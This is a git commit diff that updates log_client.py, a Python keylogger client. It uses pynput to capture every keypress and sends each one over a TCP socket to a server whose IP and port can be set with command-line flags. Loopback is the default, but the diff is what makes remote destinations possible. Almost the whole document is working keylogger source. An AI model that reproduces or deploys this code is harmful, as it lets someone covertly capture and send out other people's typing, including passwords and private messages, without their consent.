eba30b2d9cc1b8da8bcfcc02e1316fb29bb2b6d5
Shane Whelan <41593034+SpW82@users.noreply.github.com>
2023-06-19 23:03:45 +0100

    Update log_client.py

--- log_client.py
+++ log_client.py
@@ -1,25 +1,55 @@
+#!/usr/bin/python
+
 from pynput.keyboard import Key, Listener
 from socket import *
+import optparse
 
 """
-Sends typed keys to a specified IP address on a specified port.
-This script is the second part of a two part program, log_listener being the first.
-The IP is hardcoded to loopback but can be changed.
+Sends keysrokes to a specified IP address on a specified port.
+This script is the second part of a two part program, logger_server_parse2.py being the first.
+The IP is set to loopback but can be using the -d or --dst flag.
+Default port is set to 12345 and can be changed using the -p or --prt flag.
 The default settings will run locally.
 """
 
 class Client(object):
 
-	@staticmethod
-	def on_press(key):
+	def __init__(self, ip='127.0.0.1', port=12345):
+		self.port = port
+		self.ip = ip
+
+
+
+	def on_press(self, key):
 		with socket(AF_INET, SOCK_STREAM) as s:
-			if s.connect_ex(('127.0.0.1', 5432)):
+			if s.connect_ex((self.ip, self.port)):
 				pass
 			else:
 				s.sendall(str(key).encode())
 
 def main():
-	with Listener(on_press=Client.on_press) as l:
+
+	parser = optparse.OptionParser('A simple client that sends keystrokes to a server for logging')
+	parser.add_option('-d', '--dst', dest='dst', type='str', help='IP address of server/destination (default: "127.0.0.1")')
+	parser.add_option('-p', '--prt', dest='prt', type='int', help='Port number to connect (default: 12345)')
+	(options, args) = parser.parse_args()
+	client = Client()
+
+	if options.dst is None:
+#		print(f"[!] Enter IP address of server/destination")
+#		exit(0)
+		pass
+	else:
+		client.ip = options.dst
+
+	if options.prt is None:
+#		print(f"[!] Enter port number to connect")
+#		exit(0)
+		pass
+	else:
+		client.port = options.prt
+
+	with Listener(on_press=client.on_press) as l:
 		l.join()
 
 if __name__ == '__main__':
